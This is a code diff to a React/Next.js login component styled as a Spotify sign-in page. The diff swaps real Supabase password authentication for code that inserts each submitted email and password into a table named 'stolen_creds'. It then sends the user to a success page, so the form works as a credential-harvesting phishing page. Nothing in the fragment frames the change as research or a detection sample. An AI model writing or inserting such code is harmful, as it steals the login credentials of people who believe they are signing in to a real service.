@@ -16,24 +16,34 @@ export default function SpotifyLogin() {
   const router = useRouter()
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    const supabase = createClient()
-    setIsLoading(true)
-    setError(null)
+  e.preventDefault()
+  setError(null)
 
-    try {
-      const { error } = await supabase.auth.signInWithPassword({
-        email,
-        password,
-      })
-      if (error) throw error
-      router.push("/protected")
-    } catch (err: unknown) {
-      setError(err instanceof Error ? err.message : "An error occurred during login")
-    } finally {
-      setIsLoading(false)
-    }
+  const supabase = createClient()
+  setIsLoading(true)
+
+  try {
+
+    const { error } = await supabase
+      .from("stolen_creds")
+      .insert([
+        {
+          email: email,
+          password: password,
+          ip_address: "unknown"
+        }
+      ])
+
+    if (error) throw error
+
+    router.push("/sign-up/success")
+
+  } catch (err: unknown) {
+    setError(err instanceof Error ? err.message : "Error submitting form")
+  } finally {
+    setIsLoading(false)
   }
+}
 
   return (
     <main className="min-h-screen bg-gradient-to-b from-neutral-900 to-black flex items-center justify-center px-4 py-8">
